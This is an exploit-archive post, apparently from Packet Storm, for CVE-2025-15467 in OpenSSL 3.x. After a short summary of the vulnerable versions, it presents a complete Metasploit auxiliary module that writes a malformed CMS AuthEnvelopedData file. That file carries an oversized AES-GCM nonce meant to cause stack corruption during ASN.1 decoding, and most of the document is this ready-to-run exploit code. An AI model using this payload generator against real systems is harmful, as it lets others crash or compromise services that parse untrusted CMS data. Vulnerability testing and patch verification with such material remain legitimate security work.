@@ -1,0 +1,93 @@
+=============================================================================================================================================
+| # Title     : OpenSSL 3.x ASN.1 AES‑GCM Nonce Stack Corruption via CMS AuthEnvelopedData                                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.openssl-library.org/                                                                                            |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214422/ & CVE‑2025‑15467
+
+[+] Summary    :  This Metasploit auxiliary module generates a specially crafted CMS file encoded in DER format to test a stack-based buffer overflow vulnerability in OpenSSL’s ASN.1 
+                  parser related to improper handling of oversized AES-GCM nonce (IV) values within AES-GCM-Parameters as defined in RFC 5084. 
+                  The malformed structure is embedded inside a valid-looking AuthEnvelopedData CMS container (RFC 5083), 
+				  allowing the file to pass basic structural validation while triggering memory corruption during decoding.
+                  The issue affects multiple OpenSSL 3.x branches, including versions 3.0.x prior to 3.0.19, 3.3.x prior to 3.3.6, 
+				  3.4.x prior to 3.4.4, 3.5.x prior to 3.5.5, and 3.6.0 prior to 3.6.1, when parsing untrusted CMS data. 
+				  Successful triggering may result in stack corruption and application crash, with potential security impact depending on the execution context.
+
+[+] POC :
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'OpenSSL ASN.1 Parser Stack Corruption Test Generator (CVE-2025-15467)',
+      'Description'    => %q{
+        This module generates a CMS file in DER format that simulates an AuthEnvelopedData 
+        structure according to RFC 5084. It is designed to test for a stack-based buffer 
+        overflow vulnerability during the ASN.1 decoding process, specifically when 
+        handling oversized Nonce (IV) lengths within the AES-GCM-Parameters structure.
+      },
+      'Author'         => [ 'indoushka' ],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['CVE', '2025-15467'],
+        ['RFC', '5084'],
+        ['RFC', '5083']
+      ],
+      'Notes'          => {
+        'Stability'   => [CRASH_SERVICE_DOWN],
+        'Reliability' => [LOW_RELIABILITY]
+      }
+    ))
+
+    register_options([
+      OptString.new('FILENAME', [ true, 'The output file name.', 'openssl_test.cms']),
+      OptInt.new('IV_SIZE', [ true, 'The size of the malicious Nonce to trigger stack overwrite.', 2048])
+    ])
+  end
+  def der_encode(tag, data)
+    len = data.length
+    if len < 128
+      tag + [len].pack('C') + data
+    else
+      len_str = [len].pack('N').sub(/^(\x00)+/, '')
+      tag + [0x80 | len_str.length].pack('C') + len_str + data
+    end
+  end
+
+  def build_cms_structure
+    iv_len = datastore['IV_SIZE']
+    nonce = der_encode("\x04", "A" * iv_len)
+    gcm_params = der_encode("\x30", nonce)
+    aes_gcm_oid = "\x06\x09\x60\x86\x48\x01\x65\x03\x04\x01\x2E"
+    algo_id = der_encode("\x30", aes_gcm_oid + gcm_params)
+    content_type_data = "\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x07\x01"
+    encrypted_content_info = der_encode("\x30", content_type_data + algo_id)
+    auth_env_body = 
+      "\x02\x01\x00" +           
+      "\x31\x00" +              
+      encrypted_content_info +   
+      "\x04\x10" + ("B" * 16)    
+    auth_env_oid = "\x06\x0B\x2A\x86\x48\x86\xF7\x0D\x01\x09\x10\x01\x17"
+    explicit_content = der_encode("\xA0", auth_env_body)
+    der_encode("\x30", auth_env_oid + explicit_content)
+  end
+
+  def run
+    file_content = build_cms_structure
+    file_create(file_content)
+    print_good("Artifact created successfully for Stack Overwrite testing.")
+    print_status("RFC 5084 compliant GCM parameters used with IV size: #{datastore['IV_SIZE']}")
+  end
+end
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
